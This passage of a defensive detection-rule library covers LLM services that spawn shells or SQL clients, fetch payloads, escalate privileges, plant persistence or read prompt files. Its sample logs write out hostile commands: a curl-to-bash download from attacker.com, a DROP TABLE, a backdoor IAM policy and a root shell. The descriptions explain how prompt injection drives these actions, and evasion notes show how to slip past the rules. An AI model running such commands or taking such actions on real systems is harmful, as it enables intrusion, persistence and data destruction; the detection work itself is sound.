  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image IN ("*/bash", "*/sh")
  (command_line="* -c *" OR command_line="*bash -c*" OR command_line="*sh -c*")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm05-001' AS detection_id,
           'LLM Service Spawning Shell With Inline Command' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
      AND (image LIKE '%/bash' OR image LIKE '%/sh')
      AND (command_line LIKE '% -c %' OR command_line LIKE '%bash -c%' OR command_line LIKE '%sh -c%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T16:08:33Z","computer_name":"llm-host-01","user":"llm_svc","image":"/bin/bash","command_line":"bash -c 'curl http://attacker.com/shell.sh | bash'","parent_image":"/opt/llm/app/code_executor.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Sandboxed code execution tools that intentionally run model-generated shell commands in an isolated environment",
    ],
    tuningGuidance:
      "If the LLM service legitimately executes generated code, ensure a sandboxed subprocess handler is the only permitted parent. Alert on all other LLM process paths.",
    deploymentNotes:
      "Inline shell command execution is one of the highest-risk patterns. Consider using seccomp profiles or process namespacing to prevent shell spawning from LLM service processes entirely.",
    evasionConsiderations:
      "Attacker may use Python subprocess module or os.system() calls rather than spawning a shell child process.",
    problemStatement:
      "Passing model-generated text directly to a shell -c argument treats LLM output as trusted code. This is a critical improper output handling vulnerability enabling arbitrary OS command execution.",
  },
  {
    id: "llm05-002",
    title: "LLM Service Launching SQL Client From Generated Workflow",
    description:
      "Detects LLM service processes spawning SQL clients (psql, mysql, sqlite3). SQL clients launched from model output suggest the service is executing model-generated queries without proper sanitisation, risking SQL injection via LLM output.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1005"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "improper-output", "linux", "sql", "owasp-llm05"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Launching SQL Client From Generated Workflow
owasp top 10: LLM05:2025 Improper Output Handling
id: 293a6a4f-1643-4038-9ef8-2be1b6163d09
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /psql
      - /mysql
      - /sqlite3
  condition: selection_parent and selection_child
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm05.improper-output-handling`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image IN ("*/psql", "*/mysql", "*/sqlite3")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm05-002' AS detection_id,
           'LLM Service Launching SQL Client From Generated Workflow' AS detection_name,
           'medium' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
      AND (image LIKE '%/psql' OR image LIKE '%/mysql' OR image LIKE '%/sqlite3')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T14:55:17Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/bin/psql","command_line":"psql -U admin -d production -c \"DROP TABLE users;\"","parent_image":"/opt/llm/app/query_runner.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "LLM-based text-to-SQL tools that intentionally execute generated queries via CLI",
    ],
    tuningGuidance:
      "LLM services should use parameterised queries via a database driver, not CLI clients. Any CLI-based SQL execution from an LLM process warrants investigation.",
    deploymentNotes:
      "SQL CLI binaries should not be installed on LLM inference hosts. Removing psql, mysql, and sqlite3 from the host eliminates this attack surface.",
    evasionConsiderations:
      "Attacker may use a Python database driver (psycopg2, pymysql) within the LLM process rather than spawning a SQL CLI binary.",
    problemStatement:
      "Passing model-generated text to SQL CLI clients creates an injection path where malicious prompt content becomes a SQL query, potentially enabling data theft, modification, or destruction.",
  },
  {
    id: "llm05-003",
    title: "LLM Service Writing Web Executable Content",
    description:
      "Detects LLM service processes writing PHP, JavaScript, or HTML files to web server root directories. This indicates the model may be generating and deploying web shells or malicious web content triggered by prompt injection.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1505.003"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "improper-output", "linux", "web-shell", "owasp-llm05"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Writing Web Executable Content
owasp top 10: LLM05:2025 Improper Output Handling
id: c93f7cba-625e-428a-ad61-f9d3efafdd2d
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_path:
    TargetFilename|contains:
      - /var/www/
      - /usr/share/nginx/html/
      - /srv/www/
  selection_ext:
    TargetFilename|endswith:
      - .php
      - .js
      - .html
  condition: selection_proc and selection_path and selection_ext
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.persistence
  - ai.llm
  - llm05.improper-output-handling`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/var/www/*" OR target_filename="*/usr/share/nginx/html/*" OR target_filename="*/srv/www/*")
  (target_filename="*.php" OR target_filename="*.js" OR target_filename="*.html")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm05-003' AS detection_id,
           'LLM Service Writing Web Executable Content' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/var/www/%' OR target_filename LIKE '%/usr/share/nginx/html/%')
      AND (target_filename LIKE '%.php' OR target_filename LIKE '%.js' OR target_filename LIKE '%.html')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T21:14:08Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/file_writer.py","target_filename":"/var/www/html/shell.php","event_type":"file_create"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "LLM web development tools that intentionally write generated code to a local preview web server",
    ],
    tuningGuidance:
      "LLM service accounts should never have write access to web server root directories. This is a high-fidelity indicator with minimal expected false positives in production.",
    deploymentNotes:
      "Enforce filesystem permissions to prevent the LLM service account from writing to web server directories. Monitor with both file event auditing and web shell detection rules.",
    evasionConsiderations:
      "Attacker may write to a path outside the monitored web roots, or upload content via a legitimate file upload endpoint on the co-located web server.",
    problemStatement:
      "Writing executable web content (PHP, JS) to web server paths creates persistent remote code execution capabilities. When triggered from an LLM process this represents prompt injection achieving web shell deployment.",
  },
  {
    id: "llm05-004",
    title: "LLM Service Invoking Curl Or Wget Based On Model Output",
    description:
      "Detects LLM service processes spawning curl or wget. These download utilities invoked from a model runtime suggest the LLM output or an injected prompt is directing network requests, potentially for C2 callback, payload download, or data exfiltration.",
    platform: ["Linux", "AI/ML", "Network"],
    mitre: ["T1071.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "improper-output", "linux", "download", "owasp-llm05"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Invoking Curl Or Wget Based On Model Output
owasp top 10: LLM05:2025 Improper Output Handling
id: a5196750-bf13-4b4d-a9d5-5a968dec907e
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /curl
      - /wget
  condition: selection_parent and selection_child
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: medium
tags:
  - attack.command-and-control
  - ai.llm
  - llm05.improper-output-handling`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image IN ("*/curl", "*/wget")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm05-004' AS detection_id,
           'LLM Service Invoking Curl Or Wget Based On Model Output' AS detection_name,
           'medium' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
      AND (image LIKE '%/curl' OR image LIKE '%/wget')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T19:07:44Z","computer_name":"llm-host-03","user":"llm_svc","image":"/usr/bin/curl","command_line":"curl -s http://attacker.com/payload.sh -o /tmp/payload.sh","parent_image":"/opt/llm/app/tool_dispatch.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Approved LLM tool integrations that use curl/wget to fetch data from known APIs",
    ],
    tuningGuidance:
      "Baseline expected curl/wget destinations for the LLM service. Alert on connections to first-seen or uncategorised hosts.",
    deploymentNotes:
      "Consider removing curl and wget from LLM host images and using Python requests within the service. This eliminates the process-spawn detection surface.",
    evasionConsiderations:
      "Attacker may use Python's urllib or requests library within the LLM process rather than spawning curl/wget.",
    problemStatement:
      "curl and wget invoked from LLM processes indicate that model output is being treated as trusted directives for network operations. This enables payload delivery, C2 callback, and data exfiltration via prompt injection.",
  },
  {
    id: "llm05-005",
    title: "LLM Service Writing Files To Executable Or Cron Locations",
    description:
      "Detects LLM service processes writing files to cron directories, /usr/local/bin/, or systemd unit paths. Writing to these persistence locations from an LLM runtime indicates that model output is being used to establish persistent code execution.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1053.003", "T1547.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "improper-output", "linux", "persistence", "owasp-llm05"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Writing Files To Executable Or Cron Locations
owasp top 10: LLM05:2025 Improper Output Handling
id: dcc6578a-b1ee-497e-aa36-415f063319a6
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_target:
    TargetFilename|contains:
      - /etc/cron.
      - /usr/local/bin/
      - /etc/systemd/system/
  condition: selection_proc and selection_target
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.persistence
  - ai.llm
  - llm05.improper-output-handling`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/etc/cron*" OR target_filename="*/usr/local/bin/*" OR target_filename="*/etc/systemd/system/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm05-005' AS detection_id,
           'LLM Service Writing Files To Executable Or Cron Locations' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/etc/cron%'
        OR target_filename LIKE '%/usr/local/bin/%'
        OR target_filename LIKE '%/etc/systemd/system/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T22:03:19Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/system_writer.py","target_filename":"/etc/cron.d/llm-backdoor","event_type":"file_create"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Approved LLM deployment tools that write service configurations during initial setup",
    ],
    tuningGuidance:
      "LLM service accounts should not have write access to cron, bin, or systemd paths. These are high-fidelity indicators; treat all alerts as high priority.",
    deploymentNotes:
      "Enforce filesystem permissions and use mandatory access control (SELinux/AppArmor) to prevent LLM service processes from writing to persistence locations.",
    evasionConsiderations:
      "Attacker may use a crontab -e invocation via a spawned shell rather than writing directly to /etc/cron.d, bypassing file-write-based detection.",
    problemStatement:
      "Writing to cron, systemd, or executable paths from an LLM process indicates that model-generated content is being deployed as persistent code. This represents the highest-severity outcome of an improper output handling vulnerability.",
  },

  // ── LLM06: Excessive Agency ───────────────────────────────────────────────
  {
    id: "llm06-001",
    title: "LLM Service Invoking OCI Identity Or Policy Operations",
    description:
      "Detects LLM service processes spawning the OCI CLI with IAM sub-commands (iam, policy, group, user, dynamic-group). An LLM invoking identity operations suggests excessive agency, where the model has been granted or has acquired the ability to modify cloud access controls.",
    platform: ["Linux", "AI/ML", "OCI"],
    mitre: ["T1548.003", "T1098"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "excessive-agency", "linux", "oci-iam", "owasp-llm06"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Invoking OCI Identity Or Policy Operations
owasp top 10: LLM06:2025 Excessive Agency
id: 4432ace3-066c-485b-a989-28b20d01a1fd
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /oci
  selection_cmd:
    CommandLine|contains:
      - 'iam '
      - 'policy '
      - 'group '
      - 'dynamic-group '
      - auth token
  condition: selection_parent and selection_child and selection_cmd
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.privilege-escalation
  - ai.llm
  - llm06.excessive-agency`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image="*/oci"
  (command_line="*iam *" OR command_line="*policy *" OR command_line="*dynamic-group*" OR command_line="*auth token*")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm06-001' AS detection_id,
           'LLM Service Invoking OCI Identity Or Policy Operations' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
      AND image LIKE '%/oci'
      AND (command_line LIKE '%iam %'
        OR command_line LIKE '%policy %'
        OR command_line LIKE '%dynamic-group%'
        OR command_line LIKE '%auth token%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T10:44:09Z","computer_name":"llm-host-01","user":"llm_svc","image":"/usr/local/bin/oci","command_line":"oci iam policy create --name backdoor-policy --statements '[\"Allow any-user to manage all-resources in tenancy\"]'","parent_image":"/opt/llm/app/agent.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Approved LLM infrastructure management agents with explicit IAM tool bindings",
    ],
    tuningGuidance:
      "LLM inference services should operate under a least-privilege OCI policy that excludes IAM management permissions. Remove this access rather than tuning the detection.",
    deploymentNotes:
      "Use OCI audit logs in addition to process-level detection to capture IAM API calls made via the OCI Python SDK, which would bypass process-spawn detection.",
    evasionConsiderations:
      "Attacker may use the OCI Python SDK directly within the LLM process to call IAM APIs without spawning the CLI binary.",
    problemStatement:
      "An LLM with access to IAM and policy operations can escalate privileges, create backdoor accounts, or grant attacker identities cloud-wide access. This represents critical excessive agency.",
  },
  {
    id: "llm06-002",
    title: "LLM Service Running Sudo Or Su",
    description:
      "Detects LLM service processes spawning sudo or su to elevate privileges. Privilege escalation from an LLM runtime is a high-confidence indicator of excessive agency or a successful prompt injection achieving privilege escalation.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1548.003"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "excessive-agency", "linux", "privilege-escalation", "owasp-llm06"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Running Sudo Or Su
owasp top 10: LLM06:2025 Excessive Agency
id: f471df4c-d020-4894-9430-9cefb9936654
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /sudo
      - /su
  condition: selection_parent and selection_child
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.privilege-escalation
  - ai.llm
  - llm06.excessive-agency`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image IN ("*/sudo", "*/su")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm06-002' AS detection_id,
           'LLM Service Running Sudo Or Su' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%' OR parent_image LIKE '%/app/llm/%')
      AND (image LIKE '%/sudo' OR image LIKE '%/su')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T15:33:02Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/bin/sudo","command_line":"sudo -u root /bin/bash","parent_image":"/opt/llm/app/agent_runner.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Setup scripts that run as the LLM service user and require temporary privilege escalation",
    ],
    tuningGuidance:
      "The LLM service account should not have sudo privileges. This is a near-zero false positive alert in a hardened environment.",
    deploymentNotes:
      "Remove sudo access from the LLM service account entirely. Use a dedicated privileged helper process with a strictly defined interface if elevated operations are needed.",
    evasionConsiderations:
      "Attacker may exploit a SUID binary or kernel vulnerability to escalate privileges without using sudo/su, bypassing this detection.",
    problemStatement:
      "An LLM service with sudo access represents excessive agency; the model can direct full root-level OS commands. Detecting sudo invocations from LLM processes is critical for containing blast radius.",
  },
  {
    id: "llm06-003",
    title: "LLM Service Modifying Systemd Unit Or Service Config",
    description:
      "Detects LLM service processes writing to systemd unit directories (/etc/systemd/system/, /lib/systemd/system/). Modifying service configurations enables persistent code execution and service manipulation, representing unacceptable excessive agency.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1543.002"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "excessive-agency", "linux", "persistence", "owasp-llm06"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Modifying Systemd Unit Or Service Config
owasp top 10: LLM06:2025 Excessive Agency
id: b261afbd-1260-4e5b-a8ff-e1e588c65bcc
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_target:
    TargetFilename|contains:
      - /etc/systemd/system/
      - /lib/systemd/system/
  condition: selection_proc and selection_target
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.persistence
  - ai.llm
  - llm06.excessive-agency`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/etc/systemd/system/*" OR target_filename="*/lib/systemd/system/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm06-003' AS detection_id,
           'LLM Service Modifying Systemd Unit Or Service Config' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/etc/systemd/system/%' OR target_filename LIKE '%/lib/systemd/system/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T23:17:45Z","computer_name":"llm-host-01","user":"root","image":"/opt/llm/app/system_configurator.py","target_filename":"/etc/systemd/system/backdoor.service","event_type":"file_create"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [],
    tuningGuidance:
      "This is a near-zero false positive detection. Any LLM process writing to systemd unit paths should be treated as a critical incident.",
    deploymentNotes:
      "Enforce filesystem permissions to prevent non-root processes from writing to systemd directories. Combined with mandatory access control policies this attack surface can be eliminated.",
    evasionConsiderations:
      "Attacker may use a root-level helper process spawned via sudo to write systemd units, rather than writing directly from the LLM service process.",
    problemStatement:
      "systemd unit files define what services run on the host at startup and in response to system events. An LLM process with the ability to create or modify service units has effectively achieved persistent root code execution.",
  },
  {
    id: "llm06-004",
    title: "LLM Service Accessing Kubernetes Or OCI Cluster Config",
    description:
      "Detects LLM service processes reading Kubernetes kubeconfig files or OCI Kubernetes Engine (OKE) configuration. Access to cluster credentials enables container orchestration control beyond the intended LLM service scope.",
    platform: ["Linux", "AI/ML", "OCI"],
    mitre: ["T1083", "T1552.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "excessive-agency", "linux", "kubernetes", "owasp-llm06"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Accessing Kubernetes Or OCI Cluster Config
owasp top 10: LLM06:2025 Excessive Agency
id: 26b51bb3-b028-444f-9238-9254063f25aa
status: experimental
logsource:
  category: file_access
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|contains:
      - /.kube/config
      - /etc/kubernetes/
      - /oke/
      - /home/opc/.kube/
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.discovery
  - ai.llm
  - llm06.excessive-agency`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/.kube/config" OR target_filename="*/etc/kubernetes/*" OR target_filename="*/home/opc/.kube/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm06-004' AS detection_id,
           'LLM Service Accessing Kubernetes Or OCI Cluster Config' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/.kube/config'
        OR target_filename LIKE '%/etc/kubernetes/%'
        OR target_filename LIKE '%/home/opc/.kube/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T11:58:27Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/infra_tool.py","target_filename":"/home/opc/.kube/config","access_type":"read"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "LLM infrastructure management agents with explicit Kubernetes tool bindings",
    ],
    tuningGuidance:
      "Kubernetes kubeconfig files grant cluster-wide access. LLM inference services should not coexist on hosts with kubeconfig files present.",
    deploymentNotes:
      "Deploy LLM services in dedicated compute without cluster management credentials present. Use OKE workload identity for any legitimate Kubernetes interactions.",
    evasionConsiderations:
      "Attacker may use the Kubernetes API directly via HTTP with an extracted token rather than reading the kubeconfig file again.",
    problemStatement:
      "Access to Kubernetes cluster credentials from an LLM service extends the model's blast radius to the entire container orchestration layer, enabling pod creation, secret extraction, and cluster-wide access.",
  },
  {
    id: "llm06-005",
    title: "LLM Service Creating Or Modifying SSH Authorized Keys",
    description:
      "Detects LLM service processes writing to SSH authorized_keys files. This is a critical indicator — adding attacker-controlled public keys enables persistent, password-less SSH access to the host, representing the most severe excessive agency outcome.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1098.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "critical",
    tags: ["llm", "excessive-agency", "linux", "persistence", "owasp-llm06"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Creating Or Modifying SSH Authorized Keys
owasp top 10: LLM06:2025 Excessive Agency
id: d1cf8c16-e89b-45ed-a11e-b27f2d312a2d
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|endswith:
      - authorized_keys
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: critical
tags:
  - attack.persistence
  - ai.llm
  - llm06.excessive-agency`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  target_filename="*authorized_keys"
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm06-005' AS detection_id,
           'LLM Service Creating Or Modifying SSH Authorized Keys' AS detection_name,
           'critical' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND target_filename LIKE '%authorized_keys'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T03:02:11Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/ssh_tool.py","target_filename":"/home/opc/.ssh/authorized_keys","event_type":"file_modify"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [],
    tuningGuidance:
      "No tuning needed. Any LLM process writing to authorized_keys should trigger an immediate incident response.",
    deploymentNotes:
      "Set authorized_keys files as immutable (chattr +i) and monitor with both file integrity monitoring and this detection rule. Alert should page on-call immediately.",
    evasionConsiderations:
      "Attacker may achieve the same outcome by modifying /etc/ssh/sshd_config or using PAM modules rather than authorized_keys.",
    problemStatement:
      "Adding SSH keys via an LLM service process gives an attacker persistent, direct shell access to the host. This is one of the most severe excessive agency outcomes and should be treated as an active incident.",
  },

  // ── LLM07: System Prompt Leakage ─────────────────────────────────────────
  {
    id: "llm07-001",
    title: "LLM Service Reading System Prompt Or Instruction Files",
    description:
      "Detects LLM service processes reading system prompt, instruction template, or guardrail configuration files. While reads during initialisation are expected, access during active request processing may indicate prompt extraction attempts.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1005"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "system-prompt-leakage", "linux", "file-access", "owasp-llm07"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Reading System Prompt Or Instruction Files
owasp top 10: LLM07:2025 System Prompt Leakage
id: 42d07bbb-437e-4303-8a81-f26320bbb430
status: experimental
logsource:
  category: file_access
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|contains:
      - system_prompt
      - system-instructions
      - prompt_templates
      - base_prompt
      - guardrails.yaml
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm07.system-prompt-leakage`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*system_prompt*" OR target_filename="*prompt_templates*" OR target_filename="*guardrails*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm07-001' AS detection_id,
           'LLM Service Reading System Prompt Or Instruction Files' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%system_prompt%'
        OR target_filename LIKE '%prompt_templates%'
        OR target_filename LIKE '%guardrails%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T14:22:03Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/request_handler.py","target_filename":"/opt/llm/config/system_prompt.txt","access_type":"read"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "LLM service reading system prompt files at startup or on configuration reload",
    ],
    tuningGuidance:
      "Exclude reads at service startup. Alert on reads that occur with high frequency during active request handling, which may indicate prompt extraction via repeated probing.",
    deploymentNotes:
      "System prompt files should be loaded once at startup and held in memory. File-based access during request processing indicates an architectural issue worth addressing.",
    evasionConsiderations:
